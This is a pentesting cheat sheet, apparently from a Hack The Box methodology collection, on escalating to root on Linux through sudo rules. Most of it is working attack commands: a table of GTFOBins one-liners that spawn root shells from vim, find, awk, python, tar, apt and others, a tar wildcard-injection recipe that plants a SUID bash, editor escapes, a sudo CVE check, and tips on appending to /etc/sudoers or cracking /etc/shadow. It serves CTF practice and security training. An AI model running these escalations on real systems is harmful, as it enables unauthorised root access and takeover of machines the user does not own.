# sudo Enumeration & GTFOBins Abuse

> The single highest-yield Linux privesc check. `sudo -l` plus
> [GTFOBins](https://gtfobins.github.io) ends a large fraction of HTB
> Linux boxes.

## Objective
Identify allowed sudo rules for the current user and escalate via any
binary that GTFOBins lists as escapable.

## When To Use
The first command on every Linux shell. Always.

## Detection Indicators
`sudo -l` output containing:
- `(ALL : ALL) ALL` — game over.
- `(root) NOPASSWD: /path/to/binary` — likely escapable.
- `(<user>) NOPASSWD: ALL` — pivot to that user, then re-check `sudo -l`.

## Enumeration Strategy

```bash
# always:
id
sudo -l                               # may or may not need a password
groups
```

If `sudo -l` prompts for a password and you don't have it:
- Maybe the cred is in a file (re-check `~/.bash_history`).
- Maybe a different user has passwordless sudo; pivot first.

## Exploitation Workflow

For each allowed entry:
1. Identify the binary.
2. Look it up on GTFOBins.
3. Apply the documented escape.
4. If the rule includes wildcards (e.g., `/bin/find /var/log/*`), test
   filename injection / arg injection.

## Common GTFOBins escapes

| Binary | Escape |
|---|---|
| `bash`, `sh`, `dash`, `zsh` | `sudo bash` (literally) |
| `vim`, `vi` | `sudo vim -c ':!sh'` or `:!/bin/bash` |
| `nano` | `^R^X reset; bash 1>&0 2>&0` |
| `less`, `more`, `man` | `!sh` |
| `find` | `sudo find . -exec /bin/sh \; -quit` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `python` / `python3` | `sudo python -c 'import os; os.system("/bin/sh")'` |
| `perl` | `sudo perl -e 'exec "/bin/sh"'` |
| `ruby` | `sudo ruby -e 'exec("/bin/sh")'` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `sudo zip /tmp/x.zip /etc/hostname -T --unzip-command="sh -c /bin/sh"` |
| `gdb` | `sudo gdb -nx -ex '!sh' -ex quit` |
| `git` | `sudo git -p help config` then `!sh` |
| `cp` | overwrite a SUID binary or `/etc/passwd` |
| `mv` | move a tampered file into a privileged location |
| `cat` (if used to read e.g. /etc/shadow as root) | read shadow and crack |
| `tee` | append your own line to `/etc/sudoers` |
| `wget`, `curl` | exfil; or download a malicious config |
| `rsync` | `sudo rsync -e '/bin/sh' x x` |
| `apt`/`apt-get` | `sudo apt update -o APT::Update::Pre-Invoke::='/bin/sh'` |

GTFOBins lists ~300 entries — the above are the recurring HTB ones.

## Wildcard injection patterns

If sudo rule is `/usr/bin/tar -czf /backup/* /var/log/`, you can drop
files in `/var/log/` named like flags:

```bash
echo 'cp /bin/bash /tmp/r; chmod +s /tmp/r' > shell.sh
chmod +x shell.sh
cd /var/log
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# next time tar runs, your shell.sh executes as root
```

## Special case: editor escape (vi / vim / nano)

```vim
:set shell=/bin/sh
:shell
" or
:!sh
```

```nano
^R   # Read File
^X   # Execute
reset; sh 1>&0 2>&0
```

The `reset; sh 1>&0 2>&0` is the canonical nano escape. Forgetting
`reset` leaves the terminal mangled.

## Commands

```bash
sudo -l
sudo -V                # version — for sudo-CVE checks
strings $(which sudo) | head -50

# password-needed sudo: try pwfeedback (if applicable)
sudo CVE-2019-18634
```

## Tool Usage

- `gtfobins` website — check it for **every** allowed binary.
- `sudo -l -ll` — verbose list.
- `pspy` — when sudo runs scheduled tasks under another user.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Skipping `sudo -l` because "I'm just www-data" | Miss the `scriptmanager` pivot | Run it always |
| Forgetting wildcards in rules | Miss arg-injection privesc | Read the rule literally |
| Editor escape in non-interactive shell | `:!sh` does nothing | Stabilise PTY first |
| Running `sudo` without checking version | Miss applicable CVE | `sudo -V` |
| Trusting "no NOPASSWD" means safe | The user might still type the password | Search for cred reuse |

## Decision-Making Logic

```
sudo -l
 ├─ (ALL : ALL) ALL → sudo bash → root
 ├─ (root) NOPASSWD: /usr/bin/<binary>
 │    └─ check GTFOBins
 │         ├─ escape pattern works → root
 │         └─ no escape → wildcard / arg injection?
 ├─ (<user>) NOPASSWD: ALL
 │    └─ sudo -u <user> bash → pivot, re-run sudo -l
 ├─ password required
 │    └─ already have password? try it
 │    └─ otherwise check sudo -V for CVE candidates
 └─ "not allowed to run sudo"
      └─ pivot to other privesc families
```

## Pivot Opportunities
Becoming root via sudo is generally end-of-chain on a Linux box. Read
both flags, then perform post-exploitation steps appropriate to the
engagement.

## OPSEC Considerations
- `sudo` usage is logged in `/var/log/auth.log`.
- GTFOBins escapes show up as a child process of the original binary
  (e.g., `find` spawning `sh`). Trivial to detect with auditing.

## Real HTB Examples

- **OpenAdmin** — `(ALL) NOPASSWD: /bin/nano /opt/priv` → nano escape.
- **Bashed** — `(scriptmanager) NOPASSWD: ALL` → pivot user.
- **Frolic** — `sudo /usr/bin/find` → exec.
- **Curling** — sudo + GTFOBins.
- **Postman** — partial (different chain, but sudo-class privesc).
- **Networked** — wildcard injection privesc class.

## Alternative Techniques

If sudo is empty:
- Capabilities: `getcap -r / 2>/dev/null`
- SUID: `find / -perm -4000 -type f 2>/dev/null`
- Cron / pspy
- Writable PATH
- LD_PRELOAD via `env_keep`

## Automation Opportunities

```bash
# linpeas covers this; inspect:
./linpeas.sh | grep -A3 "Sudo version\|sudo -l"
```

## Checklist

- [ ] `sudo -l` run as every user
- [ ] Each allowed binary checked on GTFOBins
- [ ] Wildcards / args inspected
- [ ] sudo version checked against known CVEs
- [ ] After pivot, re-run `sudo -l` as the new user

## Related Skills

- [`linux-privesc/cron-writable-script.md`](cron-writable-script.md)
- [`linux-privesc/suid-binaries.md`](suid-binaries.md)
- [`linux-privesc/credential-reuse.md`](credential-reuse.md)
- [`tool-usage/linpeas.md`](../tool-usage/linpeas.md)
- [`methodology/06-linux-attack-flow.md`](../methodology/06-linux-attack-flow.md)
